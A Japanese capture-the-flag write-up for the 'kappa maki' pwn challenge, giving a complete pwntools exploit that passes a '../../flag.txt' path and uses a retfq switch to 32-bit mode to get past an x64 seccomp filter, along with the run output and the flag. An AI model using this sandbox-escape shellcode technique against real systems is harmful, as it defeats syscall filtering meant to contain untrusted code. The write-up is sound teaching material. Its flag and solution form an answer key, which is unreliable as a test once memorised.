# kappa maki : pwn

sandbox escapeを兼ねたshellcode問題です。  
x64上ではx86の命令を実行することが可能です。方法は2つあります。直接x86syscallを実行することと、32bitモードに変更してx86syscallを実行することです。  
本writeupでは32bitモードに変更してx86 syscallを実行する方法を掲載します。  

## Challenge
伝説の河童が営む寿司屋「河童亭」では、特製のかっぱ巻きを注文すると新かっぱ巻きと旧かっぱ巻きが選べるそうです！
ヽ(・ω・oヽ)かっぱぱヽ(o・ω・o)ﾉかっぱ(ﾉo・ω・)ﾉぱぱー♪

`nc 34.170.146.252 57267`

Attachment: kappa-maki.tar.gz

Difficulty: hard (B-side)  
Topic : seccomp  

## writeup
このコードは、指定したファイルをファイルディスクリプタ10でopenする。さらに、読み書き実行可能な指定メモリにshellcodeを配置することができる。  
許可されているsyscallは32bitのread, write syscallのみである。flag.txtをopenしてreadし、それを標準出力にwriteすればflagを取得することができる。

以下、実行コード。
```python
from pwn import *

context.log_level = "error"
p = remote("34.170.146.252", 57267)

p.recvuntil(b"buf address: 0x")
buf_addr = int(p.recvline().strip(), 16)
print(f"buf address: 0x{buf_addr:x}")
p.sendlineafter(b"filename: ", b"../../flag.txt")

DATA = (buf_addr + 0x800) & 0xffffffff

stage32  = shellcraft.i386.linux.read(10, DATA, 0x200)
stage32 += shellcraft.i386.linux.write(1, DATA, "eax")
stage32  = asm(stage32, arch='i386', os='linux')

bytes_list = ",".join(f"0x{b:02x}" for b in stage32)
stub = f"""
.intel_syntax noprefix
.global _start
_start:
    mov rsp, {buf_addr + 0x500}

    lea rax, [rip + stage32]
    push 0x23
    push rax
    retfq

stage32:
    .byte {bytes_list}
"""

payload = asm(stub, arch='amd64', os='linux')

p.sendlineafter(b"shellcode: ", payload)

p.interactive()
```
実行する。
```
$ python3 solve.py
buf address: 0x1020000
Alpaca{kappa_is_the_most_cute_1c213b61cd2b0f45bbcaafcb31cf1b748daf1c5e42ceafc06ee45824e4339d0d}$
$
```


## flag

`Alpaca{kappa_is_the_most_cute_1c213b61cd2b0f45bbcaafcb31cf1b748daf1c5e42ceafc06ee45824e4339d0d}`
